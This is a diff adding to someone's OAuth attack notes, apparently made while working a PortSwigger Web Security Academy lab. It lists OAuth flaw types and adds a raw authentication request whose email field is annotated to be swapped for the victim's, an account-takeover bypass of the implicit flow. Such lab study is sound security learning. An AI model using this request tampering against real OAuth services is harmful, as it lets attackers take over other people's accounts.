@@ -6,3 +6,20 @@
 🔹 6. ID Token Forgery (OIDC)
 🔹 7. Scopes Over-Permission
 🔹 8. No Audience / Issuer Check
+
+
+
+POST /authenticate HTTP/2
+Host: 0a4900df04b0eae581dfa277003a0056.web-security-academy.net
+Cookie: session=dhxkQMdEGhTcfwGKmVodC3dcpffUtEQ1
+Accept: application/json
+Content-Type: application/json
+Origin: https://0a4900df04b0eae581dfa277003a0056.web-security-academy.net
+Referer: https://0a4900df04b0eae581dfa277003a0056.web-security-academy.net/oauth-callback
+
+
+{
+"email":"wiener@hotdog.com",                                                          <- CHANGE(carlos@carlos-montoya.net)
+"username":"wiener",
+"token":"fMJccYCqNmURVuMuT9Jm5g0bTmd5tF6wJdYG1XCk_QK"
+}
